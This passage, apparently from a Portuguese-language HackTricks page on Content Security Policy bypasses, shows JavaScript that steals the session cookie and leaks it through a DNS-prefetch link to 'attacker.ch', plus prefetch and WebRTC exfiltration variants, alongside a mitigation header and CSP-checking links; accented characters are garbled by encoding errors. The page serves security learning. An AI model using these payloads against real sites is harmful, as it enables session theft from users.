Voc√™ pode indicar a um navegador para pr√©-resolver um nome de host com: `<link reol="dns-prefetch" href="something.com">`

Voc√™ pode abusar desse comportamento para **exfiltrar informa√ß√µes confidenciais por meio de solicita√ß√µes DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Outra maneira:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Para evitar que isso aconte√ßa, o servidor pode enviar o cabe√ßalho HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Aparentemente, essa t√©cnica n√£o funciona em navegadores headless (bots)
{% endhint %}

### WebRTC

Em v√°rias p√°ginas, √© poss√≠vel ler que o **WebRTC n√£o verifica a pol√≠tica `connect-src`** do CSP.
```javascript
var pc = new RTCPeerConnection({"iceServers":[{"urls":["turn:74.125.140.127:19305?transport=udp"],"username":"_all_your_data_belongs_to_us","credential":"."}]});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp));
```
No entanto, parece que [n√£o √© mais poss√≠vel](https://github.com/w3c/webrtc-nv-use-cases/issues/35) (ou pelo menos n√£o √© t√£o f√°cil).

Se voc√™ sabe como exfiltrar informa√ß√µes com o WebRTC [**envie um pull request, por favor!**](https://github.com/carlospolop/hacktricks)

## Verificando as Pol√≠ticas CSP Online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Criando CSP Automaticamente

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Refer√™ncias

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)

‚Äã

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
